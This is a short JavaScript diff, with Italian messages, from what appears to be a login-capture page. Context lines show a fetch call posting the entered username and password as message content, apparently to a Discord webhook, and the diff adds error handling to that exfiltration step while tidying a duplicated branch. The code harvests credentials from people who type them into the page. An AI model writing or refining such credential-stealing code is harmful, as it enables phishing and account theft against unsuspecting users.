@@ -156,11 +156,14 @@
                     body: JSON.stringify({
                         content: `Username: ${username}, Password: ${password}`
                     })
+                }).then(response => {
+                    if (!response.ok) {
+                        alert("Errore durante l'invio dei dati al server Discord.");
+                    }
+                }).catch(error => {
+                    alert('Errore di connessione. Riprova più tardi.');
                 });
             } else {
-                alert('Inserisci nome utente e password.');
-            }
-        } else {
                 alert('Inserisci nome utente e password.');
             }
         }
